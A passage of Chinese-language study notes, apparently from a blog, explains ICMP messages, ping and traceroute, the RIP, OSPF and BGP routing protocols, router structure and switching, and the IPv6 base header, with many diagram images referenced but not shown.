alt="image-20210416082743895"></p><p>有几种情况不会发送ICMP差错报告报文</p><ol><li>对 ICMP 差错报告报文不再发送 ICMP 差错报告报文。</li><li>对<strong>第一个分片的数据报片的所有后续数据报片</strong>都不发送 ICMP 差错报告报文。</li><li>对具有<strong>多播地址</strong>的数据报都不发送 ICMP 差错报告报文。</li><li>对具有<strong>特殊地址</strong>（如127.0.0.0 或 0.0.0.0）的数据报不发送 ICMP 差错报告报文。</li></ol><h3 id="ICMP-询问报文"><a href="#ICMP-询问报文" class="headerlink" title="ICMP 询问报文"></a>ICMP 询问报文</h3><p>ICMP 询问报文有两种</p><ol><li>回送请求和回答报文</li><li>时间戳请求和回答报文</li></ol><h2 id="ICMP-的应用举例"><a href="#ICMP-的应用举例" class="headerlink" title="ICMP 的应用举例"></a>ICMP 的应用举例</h2><h3 id="PING-Packet-InterNet-Groper"><a href="#PING-Packet-InterNet-Groper" class="headerlink" title="PING (Packet InterNet Groper)"></a>PING (Packet InterNet Groper)</h3><p>PING 用来测试两个主机之间的连通性。PING 使用了 <strong>ICMP 回送请求与回送回答报文</strong>。PING 是应用层直接使用网络层 ICMP 的例子，它没有通过运输层的 TCP 或UDP。 </p><p>下图是用 PING 测试主机的连通性</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20210416083452619.png" alt="image-20210416083452619"></p><h3 id="Traceroute"><a href="#Traceroute" class="headerlink" title="Traceroute"></a>Traceroute</h3><p>在 Windows 操作系统中这个命令是 tracert。它用来<strong>跟踪一个分组从源点到终点的路径</strong>。它利用 IP 数据报中的 <strong>TTL 字段</strong>和 <strong>ICMP 时间超过差错报告报文</strong>实现对从源点到终点的路径的跟踪。</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20210416084136437.png" alt="image-20210416084136437"></p><p>用 tracert 命令获得到目的主机的路由信息</p><h1 id="互联网的路由选择协议"><a href="#互联网的路由选择协议" class="headerlink" title="互联网的路由选择协议"></a><strong>互联网的路由选择协议</strong></h1><h2 id="有关路由选择协议的几个基本概念"><a href="#有关路由选择协议的几个基本概念" class="headerlink" title="有关路由选择协议的几个基本概念"></a>有关路由选择协议的几个基本概念</h2><h3 id="理想的路由算法"><a href="#理想的路由算法" class="headerlink" title="理想的路由算法"></a>理想的路由算法</h3><p>算法必须是正确的和完整的。 在计算上应简单。 应能适应通信量和网络拓扑的变化，这就是说，要有自适应性。 应具有稳定性。应是公平的。应是最佳的。 </p><p>不存在一种绝对的最佳路由算法。所谓“最佳”只能是相对于某一种特定要求下得出的较为合理的选择而已。 </p><p><strong>静态</strong>路由选择策略——即<strong>非自适应路由选择</strong>，其特点是简单和开销较小，但不能及时适应网络状态的变化。 </p><p><strong>动态</strong>路由选择策略——即<strong>自适应路由选择</strong>，其特点是能较好地适应网络状态的变化，但实现起来较为复杂，开销也比较大。 </p><h3 id="分层次的路由选择协议"><a href="#分层次的路由选择协议" class="headerlink" title="分层次的路由选择协议"></a>分层次的路由选择协议</h3><p>互联网采用分层次的路由选择协议。这是因为：</p><p>(1) 互联网的规模非常大。如果让所有的路由器知道所有的网络应怎样到达，则这种路由表将非常大，处理起来也太花时间。而所有这些路由器之间交换路由信息所需的带宽就会使互联网的通信链路饱和。</p><p>(2) 许多单位不愿意外界了解自己单位网络的布局细节和本部门所采用的路由选择协议（这属于本部门内部的事情），但同时还希望连接到互联网上。 </p><h4 id="自治系统-AS"><a href="#自治系统-AS" class="headerlink" title="自治系统 AS"></a>自治系统 AS</h4><p><strong>自治系统 AS 的定义：</strong>在单一的技术管理下的一组路由器，而这些路由器使用一种 AS 内部的路由选择协议和共同的度量以确定分组在该 AS 内的路由，同时还使用一种 AS 之间的路由选择协议用以确定分组在 AS之间的路由。</p><p>现在对自治系统 AS 的定义是强调下面的事实：尽管一个 AS 使用了多种内部路由选择协议和度量，但重要的是<strong>一个 AS 对其他 AS 表现出的是一个单一的和一致的路由选择策略</strong>。</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20210416090330427.png" alt="image-20210416090330427"></p><h4 id="内部网关协议-IGP-Interior-Gateway-Protocol"><a href="#内部网关协议-IGP-Interior-Gateway-Protocol" class="headerlink" title="内部网关协议 IGP (Interior Gateway Protocol)"></a>内部网关协议 IGP (Interior Gateway Protocol)</h4><p>在一个自治系统内部使用的路由选择协议。目前这类路由选择协议使用得最多，如 RIP 和 OSPF 协议。</p><h4 id="外部网关协议-EGP-External-Gateway-Protocol"><a href="#外部网关协议-EGP-External-Gateway-Protocol" class="headerlink" title="外部网关协议 EGP (External Gateway Protocol)"></a>外部网关协议 EGP (External Gateway Protocol)</h4><p>若源站和目的站处在不同的自治系统中，当数据报传到一个自治系统的边界时，就需要使用一种协议将路由选择信息传递到另一个自治系统中。这样的协议就是外部网关协议 EGP。在外部网关协议中目前使用最多的是 BGP-4。 </p><p>它们之间的关系可以用下面的图来表示</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20210416090740503.png" alt="image-20210416090740503"></p><p>还有两个概念要知道</p><blockquote><p>自治系统之间的路由选择也叫做<strong>域间路由选择</strong> (interdomain routing)，在自治系统内部的路由选择叫做<strong>域内路由选择</strong> (intradomain routing) 。</p></blockquote><blockquote><p>互联网的早期 RFC 文档中未使用“路由器”而是使用“网关”这一名词。但是在新的 RFC 文档中又使用了“路由器”这一名词。应当把这两个术语当作同义词</p></blockquote><h2 id="内部网关协议-RIP"><a href="#内部网关协议-RIP" class="headerlink" title="内部网关协议 RIP"></a>内部网关协议 RIP</h2><h3 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h3><p>路由信息协议 RIP (Routing Information Protocol) 是内部网关协议 IGP 中最先得到广泛使用的协议。RIP 是一种<strong>分布式的、基于距离向量的路由选择协议</strong>。<strong>RIP 协议</strong>要求网络中的每一个路由器都要维护从它自己到其他每一个目的网络的距离记录。 </p><blockquote><p>这里的“距离”不是咱们普通的单位量算，而是路由器到直接相连的网络的距离（也就是跳数）</p><p>从一个路由器到直接连接的网络的距离定义为 1。从一个路由器到非直接连接的网络的距离定义为所经过的路由器数加 1。RIP 协议中的“距离”也称为“跳数”(hop count)，因为每经过一个路由器，跳数就加 1。这里的“距离”实际上指的是“最短距离”。 </p></blockquote><p>RIP 认为一个好的路由就是它通过的路由器的数目少，即“距离短”。<br>RIP 允许<strong>一条路径最多只能包含 15 个路由器</strong>。</p><p><strong>“距离”的最大值为 16 时即相当于不可达</strong>。可见 RIP 只适用于小型互联网。</p><p>RIP <strong>不能在两个网络之间同时使用多条路由</strong>。RIP 选择一个具有最少路由器的路由（即最短路由），哪怕还存在另一条高速(低时延)但路由器较多的路由。 </p><h3 id="特点-1"><a href="#特点-1" class="headerlink" title="特点"></a>特点</h3><ol><li>仅和相邻路由器交换信息。 </li><li>交换的信息是当前本路由器所知道的全部信息，即自己的路由表。 </li><li>按固定的时间间隔交换路由信息，例如，每隔 30 秒。当网络拓扑发生变化时，路由器也及时向相邻路由器通告拓扑变化后的路由信息。</li></ol><h3 id="工作过程（路由表的建立）"><a href="#工作过程（路由表的建立）" class="headerlink" title="工作过程（路由表的建立）"></a>工作过程（路由表的建立）</h3><p>路由器在刚刚开始工作时，只知道到直接连接的网络的距离（此距离定义为 1）。它的路由表是空的。以后，每一个路由器也只和数目非常有限的相邻路由器交换并更新路由信息。经过若干次更新后，所有的路由器最终都会知道到达本自治系统中任何一个网络的最短距离和下一跳路由器的地址。</p><blockquote><p>RIP 协议的<strong>收敛 (convergence)</strong> 过程较快。“收敛”就是在自治系统中所有的结点都得到正确的路由选择信息的过程。 </p></blockquote><h3 id="距离量算法"><a href="#距离量算法" class="headerlink" title="距离量算法"></a>距离量算法</h3><p>完整算法流程如下图</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20210416091523557.png" alt="image-20210416091523557"></p><p>距离向量算法的基础就是 Bellman-Ford 算法（或 Ford-Fulkerson 算法）。这种算法的要点是这样的：设X是结点 A 到 B 的最短路径上的一个结点。若把路径 A→B 拆成两段路径 A→X 和 X→B，则每一段路径 A→X 和 X→B 也都分别是结点 A 到 X 和结点 X 到 B 的最短路径。</p><p>RIP 协议让互联网中的所有路由器都和自己的相邻路由器不断交换路由信息，并不断更新其路由表，使得从每一个路由器到每一个目的网络的路由都是最短的（即跳数最少）。</p><p>虽然所有的路由器最终都拥有了整个自治系统的全局路由信息，但由于每一个路由器的位置不同，它们的路由表当然也应当是不同的。</p><p>例题又来啦 </p><p>下图为路由表更新的一个例子以及解题过程<br><img src= "/img/loading.gif" data-src="/2021/04/18/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20210416092004254.png" alt="image-20210416092004254"></p><h3 id="RIP2-协议的报文格式"><a href="#RIP2-协议的报文格式" class="headerlink" title="RIP2 协议的报文格式"></a>RIP2 协议的报文格式</h3><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20210416092103127.png" alt="image-20210416092103127"></p><p>RIP2 报文由首部和路由部分组成。RIP2 报文中的路由部分由若干个路由信息组成。每个路由信息需要用 <strong>20 个字节</strong>。<strong>地址族标识符（又称为地址类别）字段</strong>用来标志所使用的地址协议。<strong>路由标记</strong>填入自治系统的号码，这是考虑使 RIP 有可能收到本自治系统以外的路由选择信息。再后面指出某个网络地址、该网络的子网掩码、下一跳路由器地址以及到此网络的距离。 </p><p>一个 RIP 报文最多可包括 <strong>25 个路由</strong>，因而 RIP 报文的最大长度是 4+20 x25=504 字节。如超过，必须再用一个 RIP 报文来传送。</p><p><strong>RIP2 具有简单的鉴别功能。</strong><br>若使用鉴别功能，则将原来写入第一个路由信息（20 个字节）的位置用作鉴别。在鉴别数据之后才写入路由信息，但这时最多只能再放入 24 个路由信息。</p><p><strong>RIP 协议特点：好消息传播得快，坏消息传播得慢</strong>。<br><strong>RIP 存在的一个问题：</strong>当网络出现故障时，要经过比较长的时间 (例如数分钟) 才能将此信息传送到所有的路由器。通过多图小漫画来了解该过程</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20210416092825114.png" alt="image-20210416092825114"></p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20210416092839477.png" alt="image-20210416092839477"></p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20210416092854326.png" alt="image-20210416092854326"></p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20210416092911949.png" alt="image-20210416092911949"></p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20210416092923117.png" alt="image-20210416092923117"></p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20210416092941221.png" alt="image-20210416092941221"></p><p>这就是好消息传播得快，而坏消息传播得慢。网络出故障的传播时间往往需要较长的时间(例如数分钟)。这是 RIP 的一个主要缺点。 </p><h3 id="RIP-协议的优缺点"><a href="#RIP-协议的优缺点" class="headerlink" title="RIP 协议的优缺点"></a>RIP 协议的优缺点</h3><p><strong>优点</strong>：</p><ol><li>实现简单，开销较小。</li></ol><p><strong>缺点</strong>：</p><ol><li>RIP 限制了网络的规模，它能使用的最大距离为 15（16 表示不可达）。</li><li>路由器之间交换的路由信息是路由器中的完整路由表，因而随着网络规模的扩大，开销也就增加。 </li><li>“坏消息传播得慢”，使更新过程的收敛时间过长。</li></ol><h2 id="内部网关协议-OSPF"><a href="#内部网关协议-OSPF" class="headerlink" title="内部网关协议 OSPF"></a>内部网关协议 OSPF</h2><p>开放最短路径优先 OSPF (Open Shortest Path First)是为克服 RIP 的缺点在 1989 年开发出来的。OSPF 的原理很简单，但实现起来却较复杂。</p><h3 id="特点-2"><a href="#特点-2" class="headerlink" title="特点"></a>特点</h3><p>“开放”表明 OSPF 协议不是受某一家厂商控制，而是公开发表的。</p><p>“最短路径优先”是因为使用了 Dijkstra 提出的最短路径算法 SPF</p><p>采用分布式的链路状态协议 (link state protocol)。 </p><blockquote><p>注意：OSPF 只是一个协议的名字，它并不表示其他的路由选择协议不是“最短路径优先”。</p></blockquote><p>OSPF 规定每隔一段时间，如 30 分钟，要刷新一次<strong>数据库中的链路状态</strong>。 </p><p>由于一个路由器的链路状态只涉及到与<strong>相邻路由器的连通状态</strong>，因而与整个互联网的规模并无直接关系。因此当互联网规模很大时，OSPF  协议要比距离向量协议 RIP 好得多。 </p><p>OSPF 没有“坏消息传播得慢”的问题，据统计，其响应网络变化的时间小于 100 ms。 </p><h3 id="工作方式"><a href="#工作方式" class="headerlink" title="工作方式"></a>工作方式</h3><p>向本自治系统中所有路由器发送信息，这里使用的方法是<strong>洪泛法</strong>。发送的信息就是与本路由器相邻的所有路由器的链路状态，但这只是路由器所知道的部分信息。<strong>“链路状态”就是说明本路由器都和哪些路由器相邻，以及该链路的“度量”(metric)。</strong>只有当链路状态发生变化时，路由器才用洪泛法向所有路由器发送此信息。 </p><p>由于各路由器之间频繁地交换链路状态信息，因此所有的路由器最终都能建立一个链路状态数据库。这个数据库实际上就是<strong>全网的拓扑结构图</strong>，它在全网范围内是一致的（这称为链路状态数据库的同步）。</p><p>OSPF 的链路状态数据库能较快地进行更新，使各个路由器能及时更新其路由表。OSPF 的更新过程收敛得快是其重要优点。</p><p>为了使 OSPF 能够用于规模很大的网络，OSPF 将一个自治系统再划分为若干个更小的范围，叫做区域。每一个区域都有一个 32 位的区域标识符（用点分十进制表示）。区域也不能太大，在一个区域内的路由器最好不超过 200 个。 </p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20210416093937924.png" alt="image-20210416093937924"></p><p>划分区域的好处就是将利用洪泛法交换链路状态信息的范围局限于每一个区域而不是整个的自治系统，这就减少了整个网络上的通信量。</p><p><strong>在一个区域内部的路由器只知道本区域的完整网络拓扑，而不知道其他区域的网络拓扑的情况。</strong>OSPF 使用<strong>层次结构的区域划分</strong>。在上层的区域叫做主干区域 (backbone area)。主干区域的标识符规定为0.0.0.0。主干区域的作用是用来连通其他在下层的区域。 </p><p>其中：R3、R4、R7为边界路由器，R5、R6为主干路由器</p><h3 id="OSPF-直接用-IP-数据报传送"><a href="#OSPF-直接用-IP-数据报传送" class="headerlink" title="OSPF 直接用 IP 数据报传送"></a>OSPF 直接用 IP 数据报传送</h3><p>OSPF 不用 UDP 而是直接用 IP 数据报传送。</p><p>OSPF 构成的<strong>数据报很短</strong>。这样做可<strong>减少路由信息的通信量</strong>。数据报很短的另一好处是可以不必将长的数据报分片传送。而分片传送的数据报只要丢失一个，就无法组装成原来的数据报，而整个数据报就必须重传。 </p><h3 id="负载平衡"><a href="#负载平衡" class="headerlink" title="负载平衡"></a>负载平衡</h3><p>OSPF 对不同的链路可根据 IP 分组的不同服务类型 TOS 而设置成不同的代价。因此，OSPF 对于不同类型的业务可计算出不同的路由。</p><p>如果到同一个目的网络有多条相同代价的路径，那么可以将通信量分配给这几条路径。这叫做多路径间的<strong>负载平衡</strong>。</p><p>所有在 OSPF 路由器之间交换的分组都具有鉴别的功能。<strong>支持可变长度的子网划分和无分类编址 CIDR。</strong>每一个链路状态都带上一个 32 位的序号，<strong>序号越大状态就越新</strong>。</p><h3 id="OSPF-分组"><a href="#OSPF-分组" class="headerlink" title="OSPF 分组"></a>OSPF 分组</h3><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20210416112557225.png" alt="image-20210416112557225"></p><p>OSPF <strong>的五种分组类型</strong></p><p>类型1，问候 (Hello) 分组。<br>类型2，数据库描述 (Database Description) 分组。<br>类型3，链路状态请求 (Link State Request) 分组。<br>类型4，链路状态更新 (Link State Update) 分组，用洪泛法对全网更新链路状态。<br>类型5，链路状态确认 (Link State Acknowledgment)分组。 </p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20210416112700434.png" alt="image-20210416112700434"></p><p>OSPF 使用可靠的洪泛法发送更新分组 </p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20210416112711490.png" alt="image-20210416112711490"></p><h3 id="指定的路由器"><a href="#指定的路由器" class="headerlink" title="指定的路由器"></a>指定的路由器</h3><p>若N个路由器连接在一个以太网上，则每个路由器要向其它N-1个路由器发送链路信息，因而总共需要N(N-1)个链路状态要传递</p><p>多点接入的局域网采用了指定的路由器 (designated router) 的方法，使广播的信息量大大减少。</p><p>指定的路由器代表该局域网上所有的链路向连接到该网络上的各路由器发送状态信息。 </p><h2 id="外部网关协议-BGP"><a href="#外部网关协议-BGP" class="headerlink" title="外部网关协议 BGP"></a>外部网关协议 BGP</h2><blockquote><p>简介：BGP 是<strong>不同自治系统的路由器之间交换路由信息的协议</strong>。 BGP 较新版本是 2006 年 1 月发表的 BGP-4（BGP 第 4 个版本），即 RFC 4271 ~ 4278。 可以将 BGP-4 简写为 BGP。</p></blockquote><p>互联网的规模太大，使得自治系统之间路由选择非常困难。对于自治系统之间的路由选择，要寻找最佳路由是很不现实的。当一条路径通过几个不同 AS 时，要想对这样的路径计算出有意义的代价是不太可能的。比较合理的做法是在 AS 之间交换“可达性”信息。自治系统之间的路由选择必须考虑有关策略。因此，边界网关协议 BGP 只能是力求寻找一条能够到达目的网络且比较好的路由（不能兜圈子），而并非要寻找一条最佳路由。 </p><h3 id="BGP-发言人"><a href="#BGP-发言人" class="headerlink" title="BGP 发言人"></a>BGP 发言人</h3><p>每一个自治系统的管理员要选择至少一个路由器作为该自治系统的“ BGP 发言人” (BGP speaker) 。</p><p>一般说来，两个 BGP 发言人都是通过一个共享网络连接在一起的，而 BGP 发言人往往就是 BGP 边界路由器，但也可以不是 BGP 边界路由器。 </p><h3 id="BGP-工作方式（交换路由信息）"><a href="#BGP-工作方式（交换路由信息）" class="headerlink" title="BGP 工作方式（交换路由信息）"></a>BGP 工作方式（交换路由信息）</h3><p>一个 BGP 发言人与其他自治系统中的 BGP 发言人要交换路由信息，就要<strong>先建立 TCP 连接</strong>，然后在此连接上<strong>交换 BGP 报文</strong>以<strong>建立 BGP 会话(session)</strong>，<strong>利用 BGP 会话交换路由信息</strong>。</p><p>使用 TCP 连接能提供<strong>可靠的服务</strong>，也简化了路由选择协议。使用 TCP 连接交换路由信息的两个 BGP 发言人，彼此成为对方的邻站(neighbor)或对等站(peer) 。</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20210416151101050.png" alt="image-20210416151101050"></p><p>BGP 所交换的网络可达性的信息就是要到达某个网络所要经过的一系列 AS。当 BGP 发言人互相交换了网络可达性的信息后，各 BGP 发言人就根据所采用的策略从收到的路由信息中找出到达各 AS 的较好路由。 </p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20210416151211430.png" alt="image-20210416151211430"></p><p>自治系统 AS2 的 BGP 发言人通知主干网 AS1 的 BGP 发言人：“要到达网络 N1、 N2、N3 和 N4 可经过 AS2。” </p><p>主干网还可发出通知：“要到达网络 N5、N6 和 N7 可沿路径（AS1, AS3）。” </p><h3 id="特点-3"><a href="#特点-3" class="headerlink" title="特点"></a>特点</h3><p>BGP 协议交换路由信息的结点数量级是自治系统数的量级，这要比这些自治系统中的网络数少很多。</p><p>每一个自治系统中 BGP 发言人（或边界路由器）的数目是很少的。这样就使得自治系统之间的<strong>路由选择不致过分复杂</strong>。 </p><p><strong>BGP 支持 CIDR</strong>，因此 BGP 的路由表也就应当包括目的网络前缀、下一跳路由器，以及到达该目的网络所要经过的各个自治系统序列。</p><p>在 BGP 刚刚运行时，BGP 的邻站是交换整个的 BGP 路由表。但以后只需要在<strong>发生变化时更新有变化的部分</strong>。这样做对节省网络带宽和减少路由器的处理开销都有好处。 </p><h3 id="BGP-4报文"><a href="#BGP-4报文" class="headerlink" title="BGP-4报文"></a>BGP-4报文</h3><p>BGP-4 共使用四种报文</p><ol><li><strong>打开 (OPEN) 报文</strong>，用来与相邻的另一个BGP发言人建立关系。</li><li><strong>更新 (UPDATE) 报文</strong>，用来发送某一路由的信息，以及列出要撤消的多条路由。</li><li><strong>保活 (KEEPALIVE) 报文</strong>，用来确认打开报文和周期性地证实邻站关系。</li><li><strong>通知 (NOTIFICATION) 报文</strong>，用来发送检测到的差错。</li></ol><p>注意：撤销路由一次可以撤销许多条，而增加新路由时，每条更新报文只能增加一条</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20210416151624933.png" alt="image-20210416151624933"></p><h1 id="路由器的构成"><a href="#路由器的构成" class="headerlink" title="路由器的构成"></a>路由器的构成</h1><blockquote><p>路由器是一种典型的网络层设备。路由器是互联网中的关键设备。</p></blockquote><p><strong>路由器的主要作用是：</strong></p><ol><li><strong>连通不同的网络</strong>。</li><li><strong>选择信息传送的线路</strong>。选择通畅快捷的近路，能大大提高通信速度，减轻网络系统通信负荷，节约网络系统资源，提高网络系统畅通率，从而让网络系统发挥出更大的效益来。</li></ol><h2 id="路由器的结构以及工作方式"><a href="#路由器的结构以及工作方式" class="headerlink" title="路由器的结构以及工作方式"></a>路由器的结构以及工作方式</h2><p>路由器是一种具有多个输入端口和多个输出端口的专用计算机，其任务是<strong>转发分组</strong>。也就是说，<strong>将路由器某个输入端口收到的分组，按照分组要去的目的地（即目的网络），把该分组从路由器的某个合适的输出端口转发给下一跳路由器</strong>。</p><p>下一跳路由器也按照这种方法处理分组，直到该分组到达终点为止。 路由器的转发分组正是<strong>网络层</strong>的主要工作。</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20210416152047881.png" alt="image-20210416152047881"></p><p>整个的路由器结构可划分为<strong>两大部分</strong>：</p><ol><li><strong>路由选择</strong>部分<ul><li>也叫做控制部分，其核心构件是路由选择处理机。</li><li>路由选择处理机的任务是根据所选定的路由选择协议构造出路由表，同时经常或定期地和相邻路由器交换路由信息而不断地更新和维护路由表。</li></ul></li><li>分组<strong>转发</strong>部分（由三部分组成）<ol><li>交换结构 (switching fabric)：又称为交换组织，其作用是<strong>根据转发表 (forwarding table) 对分组进行处理</strong>。</li><li>一组输入端口（硬件端口）</li><li>一组输出端口（硬件端口）</li></ol></li></ol><p><strong>“转发”(forwarding)</strong> 就是路由器根据转发表将用户的 IP 数据报从合适的端口转发出去。</p><p><strong>“路由选择”(routing)</strong> 则是按照分布式算法，根据从各相邻路由器得到的关于网络拓扑的变化情况，动态地改变所选择的路由。</p><p><strong>路由表是根据路由选择算法得出的。而转发表是从路由表得出的。</strong>在讨论路由选择的原理时，往往不去区分转发表和路由表的区别。</p><p>路由器的<strong>输入端口</strong>里面装有物理层、数据链路层和网络层的处理模块。数据链路层剥去帧首部和尾部后，将分组送到网络层的队列中排队等待处理。这会产生一定的时延。 <strong>输入端口中的查找和转发功能在路由器的交换功能中是最重要的。</strong></p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20210416153037296.png" alt="image-20210416153037296"></p><p>输出端口将交换结构传送来的分组发送到线路 </p><p>输出端口里面同样装有物理层、数据链路层和网络层的处理模块。输出端口从交换结构接收分组，然后把它们发送到路由器外面的线路上。</p><p>在网络层的处理模块中设有一个<strong>缓冲区（队列）</strong>。当交换结构传送过来的分组的速率超过输出链路的发送速率时，来不及发送的分组就必须暂时存放在这个队列中。</p><p>数据链路层处理模块将分组加上链路层的首部和尾部，交给物理层后发送到外部线路。 </p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20210416153257591.png" alt="image-20210416153257591"></p><h2 id="分组丢弃"><a href="#分组丢弃" class="headerlink" title="分组丢弃"></a>分组丢弃</h2><p>若路由器处理分组的速率赶不上分组进入队列的速率，则队列的存储空间最终必定减少到零，这就使后面再进入队列的分组由于没有存储空间而只能被丢弃。<strong>路由器中的输入或输出队列产生溢出是造成分组丢失的重要原因。</strong></p><h2 id="交换结构"><a href="#交换结构" class="headerlink" title="交换结构"></a>交换结构</h2><p>交换结构是路由器的关键构件。正是这个交换结构把分组从一个输入端口转移到某个合适的输出端口。</p><p>实现交换有多种方法。常用交换方法有三种：<br>(1) 通过存储器<br>(2) 通过总线<br>(3) 通过纵横交换结构</p><h3 id="通过存储器"><a href="#通过存储器" class="headerlink" title="通过存储器"></a>通过存储器</h3><p>(1) 当路由器的某个输入端口收到一个分组时，就用中断方式通知路由选择处理机。然后分组就从输入端口复制到存储器中。</p><p>(2) 路由器处理机从分组首部提取目的地址，查找路由表，再将分组复制到合适的输出端口的缓存中。</p><p>(3) 若存储器的带宽（读或写）为每秒 M 个分组，那么路由器的交换速率（即分组从输入端口传送到输出端口的速率）一定小于 M/2。这是因为存储器对分组的读和写花费的时间是同一个数量级</p><h3 id="通过总线"><a href="#通过总线" class="headerlink" title="通过总线"></a>通过总线</h3><p>(1) 数据报从输入端口通过共享的总线直接传送到合适的输出端口，而不需要路由选择处理机的干预。</p><p>(2) 因为每一个要转发的分组都要通过这一条总线，因此路由器的转发带宽就受总线速率的限制。如果总线在忙，则被堵塞而没法通过交换结构，并在输入端口等待</p><p>(3) 现代的技术已经可以将总线的带宽提高到每秒吉比特的速率，因此<strong>许多的路由器产品都采用这种通过总线的交换方式</strong>。</p><h3 id="通过纵横交换结构-crossbar-switch-fabric"><a href="#通过纵横交换结构-crossbar-switch-fabric" class="headerlink" title="通过纵横交换结构 (crossbar switch fabric)"></a>通过纵横交换结构 (crossbar switch fabric)</h3><p>(1) 这种交换结构常称为互连网络 (interconnection network)。</p><p>(2) 它有 2N 条总线，可以使 N 个输入端口和 N 个输出端口相连接。</p><p>(3) 当输入端口收到一个分组时，就将它发送到与该输入端口相连的水平总线上。</p><p>(4) 若通向所要转发的输出端口的垂直总线是空闲的，则在这个结点将垂直总线与水平总线接通，然后将该分组转发到这个输出端口。</p><p>(5) 但若该垂直总线已被占用（有另一个分组正在转发到同一个输出端口），则后到达的分组就被阻塞，必须在输入端口排队。</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20210416153548115.png" alt="image-20210416153548115"></p><h1 id="IPv6"><a href="#IPv6" class="headerlink" title="IPv6"></a>IPv6</h1><p>IP 是互联网的核心协议。互联网经过几十年的飞速发展，到 2011 年 2 月，IPv4 的 32 位地址已经耗尽。ISP 已经不能再申请到新的 IP 地址块了。我国在 2014 – 2015 年也逐步停止了向新用户和应用分配 IPv4 地址。解决 IP 地址耗尽的根本措施就是采用具有更大地址空间的新版本的 IP，即 IPv6。</p><p>IPv6 仍支持<strong>无连接的传送</strong>，但将协议数据单元 PDU 称为<strong>分组</strong>。为方便起见，计算机网络这本书仍采用<strong>数据报</strong>这一名词。所引进的主要变化如下：</p><ol><li><strong>更大的地址空间</strong>。IPv6 将地址从 IPv4 的 32 位 增大到了 128 位。 </li><li><strong>扩展的地址层次结构。</strong> </li><li><strong>灵活的首部格式。</strong> IPv6 定义了许多可选的扩展首部。</li><li><strong>改进的选项。</strong> IPv6 允许数据报包含有选项的控制信息，其选项放在有效载荷中。</li><li><strong>允许协议继续扩充。</strong> </li><li><strong>支持即插即用</strong>（即自动配置）。因此 IPv6 <strong>不需要使用 DHCP</strong>。</li><li><strong>支持资源的预分配</strong>。  IPv6 支持实时视像等要求，保证一定的带宽和时延的应用。</li><li><strong>IPv6 首部改为 8 字节对齐。</strong>首部长度必须是 8 字节的整数倍。原来的 IPv4 首部是 4 字节对齐。</li></ol><h2 id="IPv6-的基本首部"><a href="#IPv6-的基本首部" class="headerlink" title="IPv6 的基本首部"></a>IPv6 的基本首部</h2><p>IPv6 数据报由两大部分组成：</p><ol><li><strong>基本首部 (base header)</strong></li><li><strong>有效载荷 (payload)</strong>。有效载荷也称为净负荷。有效载荷允许有零个或多个扩展首部 (extension header)，再后面是数据部分。</li></ol><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20210416160353874.png" alt="image-20210416160353874"></p><p>IPv6 将首部长度变为固定的 40 字节，称为基本首部。把首部中不必要的功能取消了，使得 IPv6 首部的字段数减少到只有 8 个。IPv6 对首部中的某些字段进行了如下的更改：</p><ul><li>取消了首部长度字段，因为首部长度是固定的 40 字节；</li><li>取消了服务类型字段；</li><li>取消了总长度字段，改用有效载荷长度字段；</li><li>把 TTL 字段改称为跳数限制字段；</li><li>取消了协议字段，改用下一个首部字段；</li><li>取消了检验和字段；</li><li>取消了选项字段，而用扩展首部来实现选项功能。</li></ul><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20210416160803438.png" alt="image-20210416160803438"></p><p><strong>版本(version)</strong>—— 4 位。它指明了协议的版本，对 IPv6 该字段总是 6。 </p><p><strong>通信量类(traffic class)</strong>—— 8 位。这是为了区分不同的 IPv6 数据报的类别或优先级。目前正在进行不同的通信量类性能的实验。 </p><p><strong>流标号(flow label)</strong>—— 20 位。 “流”是互联网络上从特定源点到特定终点的一系列数据报， “流”所经过的路径上的路由器都保证指明的服务质量。所有属于同一个流的数据报都具有同样的流标号。 